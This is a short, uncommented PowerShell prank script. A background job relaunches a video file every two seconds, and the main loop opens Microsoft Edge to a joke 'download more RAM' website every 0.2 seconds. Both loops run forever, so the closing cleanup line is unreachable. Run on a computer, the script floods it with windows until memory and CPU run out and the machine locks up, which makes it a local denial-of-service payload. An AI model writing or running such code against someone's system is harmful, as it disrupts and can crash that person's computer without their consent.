$url = "https://downloadmoreram.com"
$tabDelay = 0.2     
$mediaFile = "spongebob.mp4"
$videoDelay = 2     

$videoJobScript = {
    param($File, $Delay)
    
    while ($true) {
        try {
            Start-Process -FilePath $File
        } catch {}
        Start-Sleep -Seconds $Delay 
    }
}

Start-Job -ScriptBlock $videoJobScript -ArgumentList $mediaFile, $videoDelay -Name "VideoLauncher" | Out-Null

while ($true) {
    Start-Process msedge $url
    
    Start-Sleep -Seconds $tabDelay 
}

Get-Job -Name "VideoLauncher" | Stop-Job -Force | Remove-Job